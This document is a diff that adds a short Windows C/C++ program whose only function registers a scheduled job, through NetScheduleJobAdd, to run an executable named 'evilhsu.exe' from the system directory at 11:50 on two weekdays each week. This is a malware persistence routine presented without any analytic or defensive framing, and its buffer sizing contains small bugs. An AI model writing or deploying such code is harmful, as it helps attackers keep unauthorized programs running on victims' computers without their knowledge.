@@ -1,0 +1,33 @@
+#include <stdio.h>
+#include <windows.h>
+#include <lmcons.h>
+#include <lmat.h>
+ #pragma comment(lib,"NETAPI32.LIB")
+ void Jobadd()
+{
+DWORD JobId;
+AT_INFO ai;
+char *filepath;
+long Len;
+char RootPath[MAX_PATH];
+WCHAR szFilePath[256];
+GetSystemDirectory(RootPath,MAX_PATH);
+filepath=new char[strlen(RootPath)+11];
+strcpy(filepath,RootPath);
+strcat(filepath,"\\evilhsu.exe");
+memset(&ai,0,sizeof(ai));
+Len=MultiByteToWideChar(CP_ACP,0,filepath,strlen(filepath),szFilePath,sizeof(szFilePath));
+szFilePath[Len] = '\0';
+ai.Command=szFilePath;
+ai.DaysOfMonth=0;
+ai.DaysOfWeek=0x60;
+ai.Flags=JOB_RUN_PERIODICALLY;
+ai.JobTime=11*60*60*1000+50*60*1000;
+NetScheduleJobAdd(NULL,LPBYTE(&ai),&JobId); 
+}
+ void main()
+{
+Jobadd();
+}
+
+
